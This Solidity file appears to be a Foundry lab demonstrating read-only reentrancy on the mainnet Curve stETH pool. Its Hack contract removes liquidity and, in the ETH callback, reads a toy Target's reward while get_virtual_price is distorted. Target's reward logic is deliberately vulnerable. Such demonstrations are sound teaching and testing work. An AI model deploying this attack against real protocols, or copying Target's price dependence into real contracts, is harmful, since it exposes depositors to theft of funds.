// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ICurve, IERC20} from "./interfaces.sol";

import "forge-std/console.sol";

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;

contract Hack {
    ICurve public curve = ICurve(STETH_POOL);
    IERC20 public lp = IERC20(LP);

    Target public immutable target;

    constructor(address _target) {
        target = Target(_target);
    }

    receive() external payable {
        console.log("During remove liquidity", curve.get_virtual_price());
        uint256 reward = target.getReward();
        console.log("Reward in Recieve", reward);
        uint256 initialLpTokensForReward = target.lpTokenBalance(address(this));
        // TODO - This doesn't work work beacause we cant reenter
        // target.unstake(initialLpTokensForReward);
    }

    function setUp() external payable {
        // ETH and STETH
        uint256[2] memory amounts = [msg.value, 0];
        // ADD liquidity
        uint256 lpTokens = curve.add_liquidity{value: msg.value}(amounts, 1);
        lp.approve(address(target), lpTokens);
        target.stake(lpTokens);
    }

    function pwn() external payable {
        // ETH and STETH
        uint256[2] memory amounts = [msg.value, 0];

        // ADD liquidity
        uint256 lpTokens = curve.add_liquidity{value: msg.value}(amounts, 1);
        // log price
        console.log("Before remove liquidity", curve.get_virtual_price());
        // remove liquidity
        uint256[2] memory amountsOut = [uint256(0), uint256(0)]; // [ETH, STETH];
        curve.remove_liquidity(lpTokens, amountsOut);

        uint256 reward = target.getReward();
        console.log("Reward in PWN", reward);
    }
}

contract Target {
    IERC20 public constant token = IERC20(LP);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint256) public lpTokenBalance;

    function stake(uint256 amount) external {
        console.log("Lp tokens staked : ", amount);
        token.transferFrom(msg.sender, address(this), amount);
        lpTokenBalance[msg.sender] += amount;
    }

    function unstake(uint256 amount) external {
        lpTokenBalance[msg.sender] -= amount;
        // token.transfer(msg.sender, amount);
        pool.remove_liquidity(amount, [uint256(0), uint256(0)]);
    }

    function getReward() external view returns (uint256) {
        uint256 reward = (lpTokenBalance[msg.sender] * pool.get_virtual_price()) / 1e18;
        // Omitting code to transfer reward tokens
        return reward;
    }
}
